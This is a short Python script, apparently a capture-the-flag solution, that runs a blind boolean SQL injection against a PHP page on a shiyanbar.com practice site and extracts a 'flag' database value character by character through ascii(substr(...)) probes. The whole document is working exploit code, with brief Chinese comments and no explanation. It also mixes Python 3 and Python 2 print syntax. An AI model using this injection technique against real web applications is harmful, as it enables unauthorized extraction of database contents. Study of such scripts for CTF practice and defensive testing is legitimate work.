# coding:utf-8
import requests
import string
string = string.digits+string.ascii_lowercase
flag = []
FLAG = False

def POC(x,i):
    url = 'http://ctf5.shiyanbar.com/web/index_3.php?id='
    poc = "1'and ascii(substr((select flag from flag),%d,1))=%d--+ " % (x, i)
    res = requests.get(url+poc)
    print('testing url:' + url + poc) # test...
    if res.text.find("Hello") > 0:
        return 1
    else:
        return 0
for x in range(1, 35):
    for i in range(35, 129):  # ascii码可见字符32-127
        if POC(x, i):
           flag.append(chr(i))  # chr()将整数转为对应的ascii码字符
           break
        elif i == 128:  # 当该位flag没有匹配的字符时退出循环
            FLAG = True
    if FLAG:
        break
# 以字符串的形式输出结果
get_flag = ''
for i in flag:
    get_flag += i
print get_flag